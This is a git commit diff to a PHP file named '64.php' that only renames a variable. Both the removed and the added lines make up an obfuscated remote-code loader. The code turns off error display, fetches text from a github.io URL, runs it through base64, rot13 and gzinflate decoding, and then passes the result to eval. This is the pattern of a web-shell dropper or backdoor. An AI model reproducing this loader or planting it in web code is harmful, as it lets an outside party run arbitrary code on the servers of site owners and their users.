8a52da31a62f0b0befe2866f07e3cc51bf6b368f
x0-1337 <108182579+x0-1337@users.noreply.github.com>
2022-11-23 23:42:45 -0800

    Update 64.php

--- 64.php
+++ 64.php
@@ -1,6 +1,6 @@
 <?php
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-$hythan= file_get_contents('https://x0-1337.github.io/phpinfo.txt');
-eval(str_rot13(gzinflate(str_rot13(base64_decode(($hythan))))));
+$rooterror= file_get_contents('https://x0-1337.github.io/phpinfo.txt');
+eval(str_rot13(gzinflate(str_rot13(base64_decode(($rooterror))))));
 ?>
